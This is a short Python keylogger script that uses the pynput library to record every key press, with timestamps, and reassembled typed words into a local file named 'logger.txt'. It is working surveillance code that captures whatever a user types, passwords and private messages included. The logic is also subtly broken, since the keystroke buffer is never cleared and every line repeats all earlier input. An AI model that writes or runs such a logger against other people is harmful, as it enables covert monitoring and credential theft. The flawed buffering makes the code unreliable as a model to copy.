from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="logger.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")

keys = []
count = 0


def typing(key):
    logging.info(str(key))


def spelling(key):
    global keys, count  # Access global variables
    if key == Key.enter:  # Write keys to file
        key = ' '
        sentence(keys)
        count = 0
    elif key == Key.space:  # Write keys to file
        key = ' '
        sentence(keys)
        count = 0
    keys.append(key)  # add the Keys
    count += 1  # keys count


def sentence(key):
    with open('logger.txt', 'a') as logfile:
        for key in keys:
            key = str(key).replace("'", "")  # Replace ' with space
            if 'key'.upper() not in key.upper():
                logfile.write(key)
        logfile.write("\n")  # Insert new line
        # lines = logfile.read().splitlines()


with Listener(on_press=typing, on_release=spelling) as listener:
    listener.join()
